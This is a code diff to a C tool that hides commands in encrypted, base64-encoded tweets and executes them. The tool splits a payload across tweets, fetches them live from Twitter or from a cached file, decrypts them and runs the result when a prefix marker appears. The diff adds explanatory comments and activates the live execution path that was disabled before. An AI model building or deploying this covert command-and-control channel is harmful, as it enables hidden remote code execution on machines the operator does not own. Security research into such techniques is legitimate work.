@@ -189,6 +189,9 @@ void PopulateTweets(char *tweet_data, int tweets_index)
     }
 }
 
+/**
+ * Base64 decode and AES-256 decrypt a tweet
+ */
 int DecryptTweet(unsigned char decryptedresult[], char * tweet)
 {
     int counter;
@@ -196,16 +199,6 @@ int DecryptTweet(unsigned char decryptedresult[], char * tweet)
 
     Base64Decode(&base64DecodeOutput, tweet);
     strlen((const char *)base64DecodeOutput);
-
-    //printf("Dumping Base64 Decoded Bytes\n");
-    //for (counter=0; counter < base64DecodedLen; counter++)
-    //{
-    //  printf("\\x%.2x",base64DecodeOutput[counter]);
-    //}
-    //printf("\n");
-
-    /* Buffer for the decrypted text */
-    //unsigned char decryptedtext[10000];
 
     int decryptedtext_len, ciphertext_len;
     unsigned char decryptedtext[10000];
@@ -237,6 +230,11 @@ int DecryptTweet(unsigned char decryptedresult[], char * tweet)
     return decryptedtext_len;
 }
 
+/**
+ * Recursively prepends tweets together from
+ * data source until prefix identifier is encountered.
+ * Once identifier is found the payload is executed.
+ **/
 void ExecuteTweet(int tweet_index, char * cmd)
 {
     // Decrypt here
@@ -262,6 +260,9 @@ void ExecuteTweet(int tweet_index, char * cmd)
     }
 }
 
+/**
+ * Reads cached tweet data from a .json file
+ **/
 char * ReadTweetsFromFile()
 {
     char *file_contents;
@@ -281,16 +282,22 @@ void Acquire()
     TwitterConnect(ACQUIRE_MODE);
 }
 
+/**
+ * Pull tweets live from a twitter account
+ **/
 void Live()
 {
-
+    char cmd[10000] = { 0 };
     InitializeTweets();
     TwitterConnect(LIVE_MODE);
     PopulateTweets(chunk.memory,0);
-    printf("About to call ExecuteTweet\n");
-    //ExecuteTweet();
+    ExecuteTweet(0, cmd);
 }
 
+/**
+ * Read tweets from a cached file to work without
+ * an internet connection
+ **/
 void Offline()
 {
     char cmd[10000] = { 0 };
@@ -299,6 +306,11 @@ void Offline()
     ExecuteTweet(0, cmd);
 }
 
+/**
+ * Divides a payload into n parts determined by the
+ * maximum tweet length allowed to account for base64 expansion
+ * and aes-256 block size padding
+ **/
 int DivideIntoTweets(char dest[][TWEET_LENGTH], char * payload, int length)
 {
 
@@ -328,6 +340,9 @@ int DivideIntoTweets(char dest[][TWEET_LENGTH], char * payload, int length)
     return divisions;
 }
 
+/**
+ * Prepends a payload with an identifier for decoding
+ */
 int AddPrefix(char * dest, char * payload)
 {
     strcat(dest, CMDPREFIX);
@@ -335,15 +350,19 @@ int AddPrefix(char * dest, char * payload)
     return strlen(dest);
 }
 
+/**
+ * Iterates through n tweets encrypting, encoding, and copying
+ * each from source to destination
+ */
 void EncodeTweets(char dest[][TWEET_LENGTH], char src[][TWEET_LENGTH], int tweetCount)
 {
     int i;
     int length;
-    char * base64Encode;
+    char * encryptEncode;
     for(i=0; i<tweetCount; i++)
     {
-        length = Encode(&base64Encode, src[i], (unsigned char *)KEY, (unsigned char *)IV);
-        strncpy(dest[i], base64Encode, length);
+        length = Encode(&encryptEncode, src[i], (unsigned char *)KEY, (unsigned char *)IV);
+        strncpy(dest[i], encryptEncode, length);
     }
 }
 
@@ -375,6 +394,8 @@ int main(int argc, char *argv[])
             printf("|------ Your Tweets Are ------|\n");
             for(i=0;i<tweetCount;i++)
                 printf("%s\n\n",encoded[i]);
+
+            printf("|------ Remember to post them in reverse order! ------|\n");
 
             break;
         default:
